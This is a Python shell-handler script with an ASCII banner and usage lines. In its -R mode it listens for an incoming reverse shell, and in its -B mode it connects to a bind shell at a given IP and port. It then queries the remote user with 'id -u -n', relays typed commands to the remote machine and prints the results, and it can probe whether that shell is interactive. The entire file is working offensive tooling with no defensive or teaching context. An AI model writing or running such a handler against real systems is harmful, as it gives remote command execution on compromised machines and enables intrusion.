import sys
import socket

print("""
██████╗ ██████╗ ██╗   ██╗     ██╗   ██╗███████╗████████╗
██╔══██╗██╔══██╗██║   ██║     ╚██╗ ██╔╝╚══███╔╝╚══██╔══╝
██║  ██║██████╔╝██║   ██║█████╗╚████╔╝   ███╔╝    ██║   
██║  ██║██╔═══╝ ██║   ██║╚════╝ ╚██╔╝   ███╔╝     ██║   
██████╔╝██║     ╚██████╔╝        ██║   ███████╗   ██║   
╚═════╝ ╚═╝      ╚═════╝         ╚═╝   ╚══════╝   ╚═╝   
                                                        
Reverse shell >> Usage ./akhyls.py -R <PORT>
Bind shell >> Usage ./akhyls.py -B <Ip> <PORT>
Author:ibrahim @via Gizem Bulut
""")
tty='[ -z "$PS1" ] && echo "[+] Interactive" || echo "[-] Not interactive" '
def reverse(port):
    try:
        reverseshell=socket.socket()
        reverseshell.bind((socket.gethostname(),int(port)))
        reverseshell.listen(1)
        print("[?] Waiting For Connection...")
        a,b=reverseshell.accept()
        print("[+] SUCCESSFUL CONNECTION")
        print(a.recv(1024).decode('utf-8'))
        print('[!] Interactive shell to check >> use command shell_check')
        a.settimeout(2)
        host=str.encode('id -u -n')
        a.send(host)
        hostname=a.recv(1024).decode('utf-8')
        while True:
            try:
                command=input((b[0]+'@'+str(hostname.strip())+":"))
                if "exit" in command:
                    a.send(str.encode("exit"))
                    print('[*] SESSION CLOSED...')
                    a.close()
                    sys.exit(1)
                elif "shell_check".lower() in command:
                    print('[*] Interactıve shell checked...')
                    a.send(str.encode(tty+'\n'))
                    print(a.recv(1024).decode('utf-8'))
                else:
                    a.send(str.encode(command))
                    print(a.recv(50000).decode('utf-8'))
            except socket.timeout:
                pass
            except socket.error:
                print("[-] Disconnected")
                a.close()
                sys.exit(1)
    except KeyboardInterrupt:
        print("[-] Connection closed")
        a.close()
        sys.exit(1)
        
def bind(ip,port) :
    try:
        print("[?] Waiting For Connection...")
        bindshell=socket.socket()
        bindshell.connect(((ip,int(port))))
        bindshell.settimeout(2)
        print(bindshell.recv(1024).decode('utf-8'))
        host=str.encode('id -u -n')
        bindshell.send(host)
        hostname=bindshell.recv(1024).decode('utf-8')
        while True:
            try:
                command=input(ip+"@"+str(hostname.strip())+":")
                if "exit" in command:
                    bindshell.send(str.encode("exit"))
                    bindshell.close()
                    sys.exit(1)
                elif "shell_check".lower() in command:
                    bindshell.send(str.encode(tty+'\n'))
                    print(bindshell.recv(1024).decode('utf-8'))
                
                else:
                    bindshell.send(str.encode(command))
                    print(bindshell.recv(50000).decode('utf-8'))
            except socket.timeout:
                pass
            except socket.error:
                print("[-] Disconnected")
                bindshell.close()
                sys.exit(1)
    except KeyboardInterrupt:
        print("[-] Connection closed")
        bindshell.close()
        sys.exit(1)
            
                          
    except Exception as f:
        print(f)
    
if __name__=='__main__':
    if len(sys.argv) < 3:
        print("[-] Missing Parameter")
        print('Usage ./akhyls.py -R <PORT>')
        print('Usage ./akhyls.py -B <Ip> <PORT>')
    elif ("-B" in sys.argv[1]):
        bind(sys.argv[2],sys.argv[3])
    elif("-R" in sys.argv[1]):
        reverse(sys.argv[2])
    


